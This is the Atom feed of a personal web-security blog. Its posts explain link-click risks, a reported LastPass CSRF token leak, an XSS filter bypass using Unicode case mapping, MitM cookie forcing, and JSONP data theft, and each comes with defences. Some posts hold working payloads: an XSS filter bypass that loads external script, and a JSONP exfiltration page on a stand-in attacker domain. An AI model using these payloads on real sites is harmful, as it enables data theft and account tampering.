<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[ahmsec]]></title>
  <link href="http://ahmsec.github.io/atom.xml" rel="self"/>
  <link href="http://ahmsec.github.io/"/>
  <updated>2020-08-09T09:17:49-07:00</updated>
  <id>http://ahmsec.github.io/</id>
  <author>
    <name><![CDATA[Ahmad Khan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Risks of Clicking Links]]></title>
    <link href="http://ahmsec.github.io/blog/2020/08/09/risks-of-clicking-links/"/>
    <updated>2020-08-09T09:20:00-07:00</updated>
    <id>http://ahmsec.github.io/blog/2020/08/09/risks-of-clicking-links</id>
    <content type="html"><![CDATA[<p>We&rsquo;re often advised not to click untrusted links, but less often told why. This post will outline a few things that can go wrong when you simply click a link.</p>

<p>In brief, clicking a link can lead to exploitation of vulnerabilities in your environment. These vulnerabilities can be in your apps, computer, local network, web browser, or even in your psyche.</p>

<h2>Web app vulnerabilities</h2>

<p>A link click can exploit vulnerabilities in web applications you use. The click can send a malicious payload directly to the target web app, or it can load a malicious website, which then sends the payload. A successful attack can result in theft or modification of data from the target web app.</p>

<p>Examples:</p>

<ul>
<li><a href="https://www.acunetix.com/blog/articles/xss-to-root-apache-org/">XSS leading to compromise of Apache Foundation</a></li>
<li><a href="https://portswigger.net/research/top-10-web-hacking-techniques">PortSwigger&rsquo;s top 10 techniques, published each year</a></li>
<li><a href="https://hackerone.com/hacktivity?order_field=popular">HackerOne feed of unending web app vulnerabilities</a></li>
</ul>


<h2>Local service vulnerabilities</h2>

<p>Your computer may be running local services like web servers or custom protocol handlers. These could be installed by users or by apps. A malicious website can send requests to these services and exploit vulnerabilities in them.</p>

<p>Examples:</p>

<ul>
<li><a href="https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5">Zoom local web server allowed websites to start your webcam</a></li>
<li><a href="https://twitter.com/taviso/status/955540415263907840">Blizzard update service allowed websites to interact with it (using DNS rebinding)</a></li>
<li><a href="https://medium.com/hackernoon/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374">Electron apps that registered protocol handlers were vulnerable to RCE</a></li>
</ul>


<h2>Local network access</h2>

<p>Your home or office network is typically walled off from the outside world. However, when you click a link and load a malicious website, your browser executes the website&rsquo;s JavaScript code. This code runs inside your network (since that&rsquo;s where the browser is). While the code is sandboxed by your browser, it can still do things like:</p>

<ul>
<li>Scan the internal network for devices and ports.</li>
<li>Exploit internal devices that have web interfaces, like IoT gadgets, printers, and routers.</li>
<li>Exploit internal web apps, which often have weaker security than internet-facing apps.</li>
</ul>


<p>Examples:</p>

<ul>
<li><a href="http://hacking-printers.net/wiki/index.php/Cross-site_printing">A website can target a printer by sending requests to port 9100</a> and subsequently <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Mueller-Exploiting-Network-Printers.pdf">exploit vulnerabilities</a> there</li>
<li><a href="https://github.com/beefproject/beef/wiki/Network-Discovery#network-map">The BeEF tool has a feature that maps internal networks</a></li>
<li>Corporate networks often have internal apps that set overly permissive CORS or lack authentication. These apps may be internal tools or development versions of public apps. It&rsquo;s assumed that they&rsquo;re protected by VPN, but a malicious website can exploit them using cross-origin requests, DNS rebinding, and more.</li>
</ul>


<h2>Browser vulnerabilities</h2>

<p>Your web browser may have vulnerabilities, even if it’s a modern and commonly-used browser. When you click a link and load a malicious website, the website can break out of the browser&rsquo;s security controls. This can allow the website to execute code on your device, install malware, or access your accounts on other websites. Browser plugins may also introduce vulnerabilities.</p>

<p>This is perhaps the most fearsome risk in this list. Someone can gain control over your device simply by having you visit a website. Everyone uses web browsers, so anyone can be targeted. Fortunately however, browser vulnerabilities are not easy to come by, and are quickly patched after discovery.</p>

<p>Examples:</p>

<ul>
<li><a href="https://www.chromium.org/Home/chromium-security/site-isolation#TOC-Motivation">Chromium document describing some browser attacks: arbitrary code execution, UXSS, and Spectre-like side channel attacks</a> (in the Motivation section)</li>
<li><a href="https://blog.coinbase.com/responding-to-firefox-0-days-in-the-wild-d9c85a57f15b">Coinbase article on how they were targeted by Firefox exploits</a></li>
<li><a href="https://guard.io/blog/evernote-universal-xss-vulnerability">Evernote plugin for Chrome allowed malicious websites to access other websites</a></li>
</ul>


<h2>Privacy</h2>

<p>Clicking a link and visiting a website may expose your personal information. This can include your IP address, geolocation, operating system, language, browser information, and more. This information can be unique to you, and may be correlated with activity on other websites.</p>

<p>Example:</p>

<ul>
<li><a href="https://panopticlick.eff.org/">EFF website that demonstrates what private information can be leaked</a> (Click &ldquo;Show full results for fingerprinting&rdquo; after the test)</li>
</ul>


<h2>Phishing</h2>

<p>Clicking a link can take you to a webpage that tricks you (or &ldquo;phishes&rdquo; you) into entering your credentials, downloading &amp; running malware, or compromising you in some other way. Good attacks can appear convincing and legitimate.</p>

<p>While phishing could require more than just clicking a link, it is perhaps the most common risk of clicking links, and is frequently the first step in a broader attack.</p>

<p>Examples:</p>

<ul>
<li><a href="https://www.bleepingcomputer.com/news/security/phishing-attack-hijacks-office-365-accounts-using-oauth-apps/">Phishing campaign targeting O365 OAuth</a></li>
<li><a href="https://citizenlab.ca/2020/06/dark-basin-uncovering-a-massive-hack-for-hire-operation/">Citizen Lab report on a hacking operation that largely used phishing</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware">How Microsoft Office files can contain malware</a></li>
</ul>


<h2>Mitigations</h2>

<p>Given all that can go wrong, what can you do about it?</p>

<p>It comes down to basic security hygiene. Use U2F/2FA, use password managers, keep all software up-to-date, avoid installing unnecessary software, limit app permissions to what is necessary, log out of accounts you&rsquo;re not using, and put untrusted &ldquo;smart&rdquo; devices on separate network segments.</p>

<p>To the extent practical, exercise caution with unsolicited links. Check if the domain is one you trust. Be careful of what you enter, approve, download, or run.</p>

<p>Finally, security practitioners need to ensure that their systems and environments are resilient to users clicking on malicious links. It is unreasonable to expect users never to click on malicious links. Typical internet usage involves clicking many links, and good phishing scenarios are difficult to distinguish from legitimate scenarios.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSRF Token Leak in LastPass Website Client]]></title>
    <link href="http://ahmsec.github.io/blog/2019/01/12/csrf-token-leak-in-lastpass-website-client/"/>
    <updated>2019-01-12T17:00:00-08:00</updated>
    <id>http://ahmsec.github.io/blog/2019/01/12/csrf-token-leak-in-lastpass-website-client</id>
    <content type="html"><![CDATA[<p>Here is a bug I reported to LastPass, copied below with some edits. They shipped a fix within 4 business days and paid out a $1k bounty.</p>

<p>One takeaway is the need for defense-in-depth. While our development standards may prohibit sensitive tokens in URLs, it can still happen due to human error. We can mitigate this by adding a strict <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referrer Policy</a> like <code>&lt;meta name="referrer" content="no-referrer"&gt;</code>.</p>

<p>A second takeaway is the importance of secure defaults. In this scenario the top-level frame actually had an <code>origin</code> Referrer Policy. However, it did not prevent the vulnerability because the browser didn&rsquo;t <a href="https://www.w3.org/TR/referrer-policy/#referrer-policy-delivery-nested">inherit</a> the policy to child iframes. A more secure default could perhaps be for browsers to inherit Referrer Policy to child iframes if they&rsquo;re on the same origin and don&rsquo;t specify their own policy.</p>

<h2>LastPass Bug Report</h2>

<h3>Summary</h3>

<p>The website client (<a href="https://lastpass.com">https://lastpass.com</a>) leaks CSRF tokens to saved websites. This happens because the iframe containing &ldquo;Launch&rdquo; buttons has the CSRF token embedded in the <code>src</code> attribute.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&quot;newvault&quot;</span> <span class="na">style=</span><span class="s">&quot;border: 0px; width: 100%; height: 100%;&quot;</span> <span class="na">src=</span><span class="s">&quot;newvault/vault.php?noscript=1&amp;amp;fromindex=1&amp;amp;ac=1&amp;amp;lpnorefresh=1&amp;amp;fromwebsite=1&amp;amp;newvault=1&amp;amp;nk=1&amp;amp;xmlerr=1&amp;amp;token=[redacted]&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability affects Firefox and potentially other browsers, but does not appear to affect Chrome (not sure why, could be browser referrer policy inheritance or different app codebases).</p>

<h3>Impact</h3>

<p>A malicious webpage can make various state-changing requests to LastPass, and LastPass will honor them.</p>

<p>Affected endpoints include changing password hint and changing master password (only resulting in account lockout, not credential leak).</p>

<p>There are likely to be more affected endpoints.</p>

<h3>Reproduction steps</h3>

<ol>
<li>Log into the Firefox website client on <a href="https://lastpass.com.">https://lastpass.com.</a></li>
<li>Add a new site and set the URL to <a href="https://www.example.com.">https://www.example.com.</a></li>
<li>Click &lsquo;Launch&rsquo; on the new site.</li>
<li>On the launched page, open your browser dev console and type <code>document.referrer</code>.</li>
<li>Notice the LastPass CSRF token included in the referrer. This is readable by target sites.</li>
</ol>


<p>If anything doesn&rsquo;t work, be sure you set the target to an HTTPS site, used Firefox, and used the website client and not the extension.</p>

<h3>Proof of concept</h3>

<ol>
<li>Use Firefox to log into <a href="https://lastpass.com.">https://lastpass.com.</a></li>
<li>Add a new site and set the URL to <a href="https://poc.ahmsec.io/3302aa361e2a44ca9bb82d66bfedd243/lastpass-csrf.html">https://poc.ahmsec.io/3302aa361e2a44ca9bb82d66bfedd243/lastpass-csrf.html</a>.</li>
<li>Click &lsquo;Launch&rsquo; on the newly added site.</li>
<li>Click &lsquo;Change my password hint&rsquo;. <em>A real exploit would do this step silently without prompt.</em></li>
<li>Check your password hint and notice that it changed to &ldquo;i-got-hacked&rdquo;.</li>
</ol>


<h3>Potential attack scenarios</h3>

<ul>
<li>Victim generates &amp; saves creds for some shady one-off online store. Online store is either compromised or malicious. When victim launches site from LastPass, the site can carry out CSRF attacks against victim&rsquo;s LastPass.</li>
<li>Malicious user shares site with victim on LastPass. Victim launches site to check it out, and is attacked via CSRF.</li>
</ul>


<h3>Suggested mitigations</h3>

<ol>
<li>Send CSRF tokens in request body or header instead of URL parameter.

<ul>
<li>URL parameters have higher risk of leakage via referrers and logs.</li>
</ul>
</li>
<li>Add a <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> referrer policy to <a href="https://lastpass.com/newvault/vault.php.">https://lastpass.com/newvault/vault.php.</a>

<ul>
<li>This policy is included on the parent frame, but not in the vault.php nested iframe.</li>
</ul>
</li>
<li>On highly sensitive endpoints, <em>require</em> password hash in addition to CSRF token.

<ul>
<li>E.g. while password changes do require entering old password, the final POST request can be made without it. (See sample request.)</li>
</ul>
</li>
<li>Restrict CSRF tokens to sessions. Do not let them be reused across sessions.</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Filter Evasion via Case Change]]></title>
    <link href="http://ahmsec.github.io/blog/2018/11/22/xss-filter-evasion-via-case-change/"/>
    <updated>2018-11-22T14:32:00-08:00</updated>
    <id>http://ahmsec.github.io/blog/2018/11/22/xss-filter-evasion-via-case-change</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/x00x90_/status/1060397253024727040">This</a> tweet describes an interesting behavior: certain non-ASCII characters map to ASCII characters when converted to upper- or lower-case. Specifically:</p>

<pre><code>ı (\u0131) to upper-case --&gt; I
ſ (\u017f) to upper-case --&gt; S
İ (\u0130) to lower-case --&gt; i
K (\u212a) to lower-case --&gt; k
</code></pre>

<p>This can help bypass XSS filters and blacklists. For example, the filter in the app below can be bypassed by <code>?name=&lt;ſcript src="http://ahmsec.github.io/alert1.js"&gt;&lt;/script&gt;</code>.</p>

<figure class='code'><figcaption><span>vulnerable-app.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
</span><span class='line'><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;name&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s">&#39;guest&#39;</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;&lt;script&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span><span class='line'>        <span class="k">return</span> <span class="s">&#39;XSS DENIED!&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&lt;html&gt;Welcome, &#39;</span> <span class="o">+</span> <span class="n">name</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#39;!&lt;/html&gt;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/ALERT1.JS&quot;</span><span class="p">)</span> <span class="c">#normally hosted on attacker site</span>
</span><span class='line'><span class="k">def</span> <span class="nf">alert1</span><span class="p">():</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;alert(1)&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As usual, the best practice for XSS prevention is <a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">character encoding</a>. Blacklists are easily <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">bypassed</a>.</p>

<p>Here is a quick script to enumerate characters affected by this behavior. Interestingly, it appears that Python 2 and 3 treat <code>İ (\u0130)</code> differently.</p>

<figure class='code'><figcaption><span>casing-xss.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">interestingChars</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span><span class="mi">91</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">123</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10FFFF</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span class='line'>    <span class="n">char</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;utf-32&#39;</span><span class="p">,</span> <span class="s">&#39;surrogatepass&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">charLower</span> <span class="o">=</span> <span class="n">char</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">charLower</span> <span class="ow">in</span> <span class="n">interestingChars</span> <span class="ow">and</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">interestingChars</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;{} ({}) to lower-case --&gt; {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf8&#39;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">charLower</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">charUpper</span> <span class="o">=</span> <span class="n">char</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">charUpper</span> <span class="ow">in</span> <span class="n">interestingChars</span> <span class="ow">and</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">interestingChars</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;{} ({}) to upper-case --&gt; {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf8&#39;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">charUpper</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSRF: Double Submit Cookies Insufficient Against MitM]]></title>
    <link href="http://ahmsec.github.io/blog/2016/08/31/csrf-double-submit-cookies-insufficient-against-mitm/"/>
    <updated>2016-08-31T08:38:05-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/08/31/csrf-double-submit-cookies-insufficient-against-mitm</id>
    <content type="html"><![CDATA[<p>Suppose you’re at the latest hip coffee shop in town, enjoying their comfy chairs and high-speed wifi. You’re doing some confidential work using a relatively secure web application. The application always uses TLS, redirects HTTP requests back to HTTPS, and deploys <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#Double_Submit_Cookie">Double Submit Cookies</a> (with the ‘secure’ cookie flag) to protect from CSRF. Now suppose that the coffee shop staff becomes part of your threat model. Could they still launch CSRF attacks against you? After all, they can’t read TLS-encrypted traffic, so they can’t possibly steal CSRF tokens.</p>

<p>It turns out that actually yes, given the scenario above, a man-in-the-middle (with your pick of malicious staff, rogue access point, or ARP poisoning) can defeat the Double Submit defense. And it’s a simple attack, not one that requires you to break TLS or WPA2. Here’s how it works:</p>

<ol>
<li>Victim conducts secret business on <a href="https://secret.example.com">https://secret.example.com</a> (MitM attacker can’t read this traffic.)</li>
<li>Victim visits a non-SSL website like <a href="http://stackoverflow.com">http://stackoverflow.com</a> or <a href="http://www.cnn.com">http://www.cnn.com</a> (MitM can read and modify this traffic.)</li>
<li>MitM injects <code>&lt;img src=”http://secret.example.com/non-existent.png”/&gt;</code> into the response from (2). Note that the img tag’s protocol is HTTP and not HTTPS.</li>
<li>Victim’s browser receives the image tag, and sends a secondary non-SSL request to <a href="http://secret.example.com/non-existent.png.">http://secret.example.com/non-existent.png.</a> (CSRF cookie not sent because of secure flag.)</li>
<li>MitM intercepts the response from <a href="http://secret.example.com,">http://secret.example.com,</a> which could be a 301 redirect [1] or a 404 error, and injects a Set-Cookie header that overwrites the victim’s CSRF cookie with a known value. Details on how later.</li>
<li>Since the attacker knows the CSRF cookie value, he or she can now trigger a request that includes the CSRF token in the body.</li>
</ol>


<p>All of this can be automated for your exploit. A non-intuitive step in this attack scenario is perhaps #5. How could a non-SSL response possibly overwrite cookies that have the ‘secure’ flag and that were set under SSL? That unfortunately is allowed by design and is how the web works today. Here’s an article that describes the issue: <a href="http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html">http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html</a> .</p>

<p>One way to protect against this scenario is to use HSTS. However, you have to make sure that every single subdomain has HSTS, because any child subdomain can be used to set cookies for the top-level parent domain, and those cookies will subsequently be sent with requests to every subdomain. You also have make sure you don’t have users on browsers without <a href="http://caniuse.com/#feat=stricttransportsecurity">HSTS support</a>, such as IE &lt; v11.</p>

<p>A few takeaways:</p>

<ol>
<li>Double Submit Cookies are a common way to protect against CSRF. They’re recommended by OWASP and used by several websites and frameworks. However, if you need to protect against MitM, you should consider a different defense.</li>
<li>Cookies should be treated as untrusted and attacker-controlled input. Be careful of mistakes like allowing user-generated session cookies and not sanitizing cookie-sourced values for XSS.</li>
</ol>


<p>For further discussion on these topics, please see the following articles. <br/>
&nbsp;&nbsp;&nbsp;&nbsp; - <a href="http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html">http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html</a><br/>
&nbsp;&nbsp;&nbsp;&nbsp; - <a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf</a></p>

<hr />

<p>[1] For a workaround to browsers’ aggressive caching of 301 redirects, see <a href="http://security.stackexchange.com/a/117138.">http://security.stackexchange.com/a/117138.</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Dangers of JSONP]]></title>
    <link href="http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp/"/>
    <updated>2016-07-05T16:34:03-05:00</updated>
    <id>http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp</id>
    <content type="html"><![CDATA[<p>This post is about how I learned of JSONP as an attack vector. This isn&rsquo;t a new vulnerability, but it&rsquo;s just nice that I discovered it on my own.</p>

<h3>A note on Same-Origin Policy</h3>

<p>Same-Origin Policy (SOP) prevents a webpage from reading data on a different domain. So if you open a tab with hacker.com, your browser won&rsquo;t let it read data on bank.com. There are notable exceptions, like <code>&lt;img&gt;</code> and <code>&lt;script&gt;</code> tags. However, browsers strictly limit their scope. For example, a webpage can only execute a cross-domain script, not read its contents.</p>

<h3>Some interesting behavior</h3>

<p>Playing with traffic in Burp I observed the following behavior. Whatever you pass in the &ldquo;callback&rdquo; parameter is reflected in the response.</p>

<p>Request: <code>GET /sensitive_resource?callback=myFunction</code> <br/>
Response: <code>myFunction({"key1":"data1", "key2":"data2", ...})</code></p>

<p>Request: <code>GET /sensitive_resource?callback=AAAAAAAA</code> <br/>
Response: <code>AAAAAAAA({"key1":"data1", "key2":"data2", ...})</code></p>

<p>My first instinct was to test for XSS, but all output was correctly encoded. The response contained private data, but it required an authenticated session to access.</p>

<p>(Later on I learned that this request/response behavior is an old technique called JSONP. It was used to get around Same-Origin Policy restrictions before CORS came about.)</p>

<h3>The exploit</h3>

<p>What if we request that resource from a <code>&lt;script&gt;</code> tag on the attacker&rsquo;s webpage? Notice that the response data is wrapped with a JavaScript function call that we control. Can we pre-define that function on the attacker&rsquo;s webpage?</p>

<p><strong>www.attacker.com:</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">exfil_function</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">parsed_data</span> <span class="o">=</span> <span class="nx">response_specific_parsing</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">alert</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">exfil</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://www.victim.com/sensitive_resource?callback=exfil_function&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And it works! The cross-domain script executes <code>exfil_function({"key1":"data1", "key2":"data2", ...})</code>, and since we control the definition of <code>exfil_function</code>, we can have it read the data!</p>

<p>Now when an authenticated victim views this malicious webpage, it does a cross-domain read of the sensitive resource and exfiltrates the private data.</p>

<h3>Lesson: don&rsquo;t use JSONP with private data</h3>

<p>JSONP effectively disables Same-Origin Policy for a resource. So be cautious of using it with private data. Instead, use CORS, which gives you fine-grained and securely designed control over cross-origin sharing.</p>

<p>A slightly related vulnerability is <a href="http://haacked.com/archive/2009/06/25/json-hijacking.aspx/">JSON Hijacking</a>. In conclusion, do not return sensitive data wrapped in JavaScript functions or arrays.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Custom Headers as CSRF Defense]]></title>
    <link href="http://ahmsec.github.io/blog/2016/07/03/custom-headers-as-csrf-defense/"/>
    <updated>2016-07-03T16:18:01-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/07/03/custom-headers-as-csrf-defense</id>
    <content type="html"><![CDATA[<p>CSRF is a prevalent and well-known vulnerability that affects web applications. The common way to protect against CSRF is to require anti-CSRF tokens on state-modifying requests. For defense in depth, you can add an extra layer of security by additionally requiring custom headers. This can mitigate scenarios where anti-CSRF tokens are somehow leaked (something I have seen happen).</p>

<h3>Simple vs Preflighted Requests</h3>

<p>The Mozilla <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">article</a> on CORS does a nice job of explaining the difference between &ldquo;simple&rdquo; and &ldquo;preflighted&rdquo; requests.</p>

<ul>
<li><p><strong>Simple requests</strong> are sent by traditional mechanisms on the web, such as GETs made by <code>&lt;img&gt;</code> tags or POSTs made by HTML forms. The browser will always send them cross-origin, and will always pass along session cookies. This behavior is what makes CSRF possible.</p></li>
<li><p><strong>Preflighted requests</strong> are requests that either contain custom headers or use methods other than GET, POST, or HEAD. Browsers will refuse to send these requests cross-origin unless the server explicitly allows it. To check this permission, browsers will send a &ldquo;pre-flight&rdquo; OPTIONS request before sending the actual request, and the server has to reply with the appropriate CORS headers. If the server doesn&rsquo;t, the actual request is never sent.</p></li>
</ul>


<p> Note the difference: simple requests are always sent cross-origin, even though Same-Origin Policy blocks the responses. When preflighted, the request isn&rsquo;t even sent in the first place.</p>

<h3>Preflighted Requests and CSRF</h3>

<p>If a resource requires a non-standard header or method, it won&rsquo;t be sent cross-origin (unless the victim domain for some reason whitelists the attacker domain). Since the request is never sent, CSRF attacks are blocked.</p>

<h3>Bypassing Custom Header Restrictions</h3>

<p>While requiring custom headers is a useful layer of CSRF defense, it shouldn&rsquo;t be the only one. Up until March 2015, Adobe Flash had a vulnerability that allowed you to send custom headers cross-origin. Here are two well-written posts describing the technique:</p>

<ul>
<li> <a href="http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html">http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html</a></li>
<li> <a href="http://www.appsecweekly.com/flash-same-origin-policy-bypass-with-307/">http://www.appsecweekly.com/flash-same-origin-policy-bypass-with-307/</a></li>
</ul>


<h3>Conclusion</h3>

<p>Consider requiring custom headers on your sensitive state-modifying requests. For example, you can require an X-Requested-With header on AJAX calls and refuse to honor those that don&rsquo;t include it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First Post!]]></title>
    <link href="http://ahmsec.github.io/blog/2016/06/24/first-post/"/>
    <updated>2016-06-24T07:15:45-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/06/24/first-post</id>
    <content type="html"><![CDATA[<p>I know you&rsquo;ve been waiting eagerly, but it&rsquo;s finally here: my own personal blog! &hellip; Just kidding, I can hear the crickets chirping. This is intended to be an informal space for me to write about topics of interest. Mostly technical posts about what I&rsquo;m learning in &ldquo;cyber&rdquo; security (to use the current vernacular). Perhaps other topics as well. If future generations come across these posts and benefit, that will be great!</p>
]]></content>
  </entry>
  
</feed>
